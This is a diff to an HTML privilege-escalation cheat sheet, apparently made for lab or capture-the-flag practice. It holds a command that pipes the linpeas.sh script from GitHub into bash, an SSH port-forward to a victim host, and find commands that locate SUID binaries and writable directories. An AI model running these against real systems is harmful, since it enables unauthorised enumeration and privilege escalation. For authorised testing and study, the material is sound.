@@ -34,6 +34,21 @@
                     <ul>
                         <h3> Linpeas.sh </h3>
                         <pre><code class="language-bash">curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</code></pre>
+
+                        <h3> Important sections to check</h3>
+                        <ul>
+                            <h4>Active ports</h4>
+                            <p>In case you found one service in a random port that you would like to check in you attacker machine use:</p>
+                            <pre><code class="language-bash">ssh -L 8000:127.0.0.1:8000 VICTIM_USERANE@VICTIM_IP</code></pre>
+                            <h4>Modified interesting files in the last 5mins</h4>
+                            <p> In some cases you can find interesting cronjobs in /opt</p>
+                        </ul>
+                        
+                        
+
+                        
+       
+
                     </ul> 
                 </div>
 
@@ -59,7 +74,7 @@
                         <h3> SUID propietary execution </h3>                          
                         <pre><code class="language-bash">find / -type f -perm -4000 2>/dev/null</code></pre>
                         <h3>Find world-executable folders </h3>
-                        <pre><code class="language-bash">find / -perm -o w -type d 2>/dev/null</code></pre>
+                        <pre><code class="language-bash">find / -type d -writable 2>/dev/null</code></pre>
                     </ul> 
                 </div>
 
